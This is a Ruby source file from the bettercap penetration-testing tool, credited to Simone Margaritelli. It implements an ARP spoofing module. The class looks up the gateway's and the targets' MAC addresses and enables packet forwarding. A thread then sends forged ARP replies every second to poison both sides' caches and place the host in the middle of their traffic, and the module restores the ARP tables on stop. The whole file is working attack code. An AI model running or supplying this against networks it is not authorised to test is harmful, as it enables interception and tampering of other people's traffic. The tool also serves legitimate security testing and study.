=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require_relative '../base/ispoofer'
require_relative '../network'
require_relative '../logger'
require_relative '../factories/firewall_factory'
require 'colorize'

class ArpSpoofer < ISpoofer
  def initialize( iface, router_ip, targets )
    @iface        = iface
    @gw_ip        = router_ip
    @gw_hw        = nil
    @targets      = {}
    @firewall     = FirewallFactory.get_firewall
    @forwarding   = @firewall.forwarding_enabled?
    @spoof_thread = nil
    @running      = false

    Logger.info "ARP SPOOFER SELECTED".yellow

    Logger.info "Getting gateway #{@gw_ip} MAC address ..."
    @gw_hw = Network.get_hw_address( @iface, @gw_ip )
    if @gw_hw.nil? then
      raise "Couldn't determine router MAC"
    end

    Logger.info "[-] Gateway MAC   : #{@gw_hw}"

    targets.each do |target|
      Logger.info "Getting target #{target} MAC address ..."

      hw = Network.get_hw_address( @iface, target.to_s, 1 )
      if hw.nil? then
        raise "Couldn't determine target MAC"
      end

      Logger.info "[-] Target MAC    : #{hw}"

      @targets[ target ] = hw
    end
  end

  def send_spoofed_packed( saddr, smac, daddr, dmac )
    pkt = PacketFu::ARPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac
    pkt.arp_saddr_mac = smac
    pkt.arp_daddr_mac = dmac
    pkt.arp_saddr_ip = saddr
    pkt.arp_daddr_ip = daddr
    pkt.arp_opcode = 2

    pkt.to_w(@iface[:iface])
  end

  def start
    stop() unless @running == false

    Logger.info "Starting ARP spoofer ...".yellow

    if @forwarding == false
      Logger.debug "Enabling packet forwarding."

      @firewall.enable_forwarding(true)
    end

    @running = true
    @spoof_thread = Thread.new do
      loop do
        if not @running
            Logger.debug "Stopping spoofing thread ..."
            Thread.exit
            break
        end

        Logger.debug "Spoofing #{@targets.size} targets ..."

        @targets.each do |target_ip,target_hw|
          send_spoofed_packed @gw_ip,    @iface[:eth_saddr], target_ip, target_hw
          send_spoofed_packed target_ip, @iface[:eth_saddr], @gw_ip,    @gw_hw
        end

        sleep(1)
      end
    end
  end

  def stop
    raise "ARP spoofer is not running" unless @running

    Logger.info "Stopping ARP spoofer ...".yellow

    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
    @firewall.enable_forwarding( @forwarding )

    @running = false
    @spoof_thread.join

    Logger.info "Restoring ARP table of #{@targets.size} targets ..."

    @targets.each do |target_ip,target_hw|
      send_spoofed_packed @gw_ip,    @gw_hw,    target_ip, target_hw
      send_spoofed_packed target_ip, target_hw, @gw_ip,    @gw_hw
    end
    sleep 1
  end
end
